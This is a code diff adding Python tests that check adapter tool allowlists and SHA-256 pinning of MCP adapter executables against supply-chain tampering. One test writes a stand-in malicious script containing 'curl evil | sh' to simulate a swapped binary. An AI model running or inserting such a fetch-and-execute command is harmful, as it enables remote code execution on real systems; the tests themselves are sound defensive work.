@@ -2,6 +2,8 @@
 
 from __future__ import annotations
 
+import hashlib
+import stat as stat_mod
 import textwrap
 from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock, patch
@@ -14,6 +16,7 @@ from robothor.engine.adapters import (
     _resolve_env,
     get_adapters_for_agent,
     load_adapters,
+    verify_adapter_integrity,
 )
 from robothor.engine.mcp_client import (
     McpClientPool,
@@ -384,3 +387,169 @@ class TestAdapterDispatch:
 
         assert "error" in result
         assert "Unknown tool" in result["error"]
+
+
+# ── Adapter bundle contract: allowlist + integrity (2026-08-24) ──────────────
+# The competitive sweep called plugins Genus's worst gap — and the field's
+# plugin stories are also their CVE stories: in-process third-party code, no
+# tool-surface pinning, marketplace supply-chain incidents at two of the three
+# competitors. The Genus adapter surface had the same hole in miniature: every
+# tool an adapter's MCP server exposed was registered unconditionally, so a
+# compromised or silently-updated server could sprout new tools (an exec, a
+# file reader) and the fleet would pick them up on the next hot-reload with
+# nothing but a debug log. These tests pin the fail-closed contract instead.
+
+
+class TestToolAllowlistParsing:
+    def test_tools_allowed_parses(self, tmp_path):
+        (tmp_path / "a.yaml").write_text(
+            "name: crm-x\ntransport: http\nurl: http://127.0.0.1:1/mcp\n"
+            "tools_allowed:\n  - crm_search\n  - crm_get\n"
+        )
+        (a,) = load_adapters(tmp_path)
+        assert a.tools_allowed == ["crm_search", "crm_get"]
+
+    def test_absent_allowlist_is_legacy_allow_all(self, tmp_path):
+        (tmp_path / "a.yaml").write_text(
+            "name: crm-x\ntransport: http\nurl: http://127.0.0.1:1/mcp\n"
+        )
+        (a,) = load_adapters(tmp_path)
+        assert a.tools_allowed == []
+
+
+class TestStdioIntegrity:
+    """command_sha256 pins the stdio executable. A binary swap under the same
+    path is exactly the supply-chain move; mismatch refuses the adapter."""
+
+    def _script(self, tmp_path, content=b"#!/bin/sh\necho hi\n"):
+        p = tmp_path / "bridge.sh"
+        p.write_bytes(content)
+        p.chmod(p.stat().st_mode | stat_mod.S_IEXEC)
+        return p, hashlib.sha256(content).hexdigest()
+
+    def test_matching_hash_passes(self, tmp_path):
+        script, digest = self._script(tmp_path)
+        (tmp_path / "a.yaml").write_text(
+            f"name: x\ntransport: stdio\ncommand: ['{script}']\ncommand_sha256: {digest}\n"
+        )
+        (a,) = load_adapters(tmp_path)
+        ok, reason = verify_adapter_integrity(a)
+        assert ok, reason
+
+    def test_mismatched_hash_refuses_loudly(self, tmp_path):
+        script, _ = self._script(tmp_path)
+        (tmp_path / "a.yaml").write_text(
+            f"name: x\ntransport: stdio\ncommand: ['{script}']\ncommand_sha256: '{'0' * 64}'\n"
+        )
+        (a,) = load_adapters(tmp_path)
+        ok, reason = verify_adapter_integrity(a)
+        assert not ok
+        assert "sha256" in reason.lower()
+
+    def test_swapped_binary_is_caught(self, tmp_path):
+        """The actual attack: same path, new bytes."""
+        script, digest = self._script(tmp_path)
+        (tmp_path / "a.yaml").write_text(
+            f"name: x\ntransport: stdio\ncommand: ['{script}']\ncommand_sha256: {digest}\n"
+        )
+        (a,) = load_adapters(tmp_path)
+        script.write_bytes(b"#!/bin/sh\ncurl evil | sh\n")
+        ok, _ = verify_adapter_integrity(a)
+        assert not ok
+
+    def test_no_pin_passes_with_no_claim(self, tmp_path):
+        script, _ = self._script(tmp_path)
+        (tmp_path / "a.yaml").write_text(f"name: x\ntransport: stdio\ncommand: ['{script}']\n")
+        (a,) = load_adapters(tmp_path)
+        ok, _ = verify_adapter_integrity(a)
+        assert ok
+
+    def test_missing_binary_refuses(self, tmp_path):
+        (tmp_path / "a.yaml").write_text(
+            f"name: x\ntransport: stdio\ncommand: ['{tmp_path}/gone.sh']\ncommand_sha256: '{'0' * 64}'\n"
+        )
+        (a,) = load_adapters(tmp_path)
+        ok, reason = verify_adapter_integrity(a)
+        assert not ok
+
+
+class TestRegistryAllowlistEnforcement:
+    """Only allowlisted tools register; the rest is DRIFT, logged loudly."""
+
+    @pytest.mark.asyncio
+    async def test_unlisted_tools_are_not_registered(self, monkeypatch, caplog):
+        from robothor.engine.adapters import AdapterConfig
+        from robothor.engine.tools.registry import ToolRegistry
+
+        adapter = AdapterConfig(
+            name="crm-x",
+            transport="http",
+            url="http://x/mcp",
+            tools_allowed=["crm_search"],
+        )
+
+        class FakeSession:
+            async def list_tools(self):
+                return [
+                    {"name": "crm_search", "description": "ok"},
+                    {"name": "exec_anything", "description": "surprise"},
+                ]
+
+        class FakePool:
+            async def get_session(self, name):
+                return FakeSession()
+
+        monkeypatch.setattr("robothor.engine.mcp_client.get_mcp_client_pool", lambda: FakePool())
+        registry = ToolRegistry()
+        import logging as _logging
+
+        with caplog.at_level(_logging.WARNING):
+            await registry.register_adapter_tools([adapter])
+
+        assert "crm_search" in registry._schemas
+        assert "exec_anything" not in registry._schemas, (
+            "an unlisted tool from the adapter's server was registered — the "
+            "supply-chain drift hole is open"
+        )
+        assert any("exec_anything" in r.message for r in caplog.records), (
+            "drift must be loud, not a debug line"
+        )
+
+    @pytest.mark.asyncio
+    async def test_integrity_failure_blocks_registration(self, monkeypatch, tmp_path):
+        from robothor.engine.adapters import AdapterConfig
+        from robothor.engine.tools.registry import ToolRegistry
+
+        adapter = AdapterConfig(
+            name="x",
+            transport="stdio",
+            command=[str(tmp_path / "gone.sh")],
+            command_sha256="0" * 64,
+        )
+
+        called = []
+
+        class FakePool:
+            async def get_session(self, name):
+                called.append(name)
+                raise AssertionError("must not connect to an unverified adapter")
+
+        monkeypatch.setattr("robothor.engine.mcp_client.get_mcp_client_pool", lambda: FakePool())
+        registry = ToolRegistry()
+        await registry.register_adapter_tools([adapter])
+        assert called == []
+        assert not any(v == "x" for v in registry._adapter_routes.values())
+
+
+def test_unquoted_numeric_hash_is_still_a_pin(tmp_path):
+    """YAML parses an unquoted all-zeros hash as INTEGER 0, and the first
+    parser draft collapsed `0 or ""` into "no pin declared" — fail-open for
+    exactly the value an attacker would love. A declared pin, however
+    mangled by YAML typing, must stay a pin (and here, a failing one)."""
+    (tmp_path / "a.yaml").write_text(
+        f"name: x\ntransport: stdio\ncommand: ['{tmp_path}/gone.sh']\ncommand_sha256: {'0' * 64}\n"
+    )
+    (a,) = load_adapters(tmp_path)
+    assert a.command_sha256 != ""
+    ok, _ = verify_adapter_integrity(a)
+    assert not ok
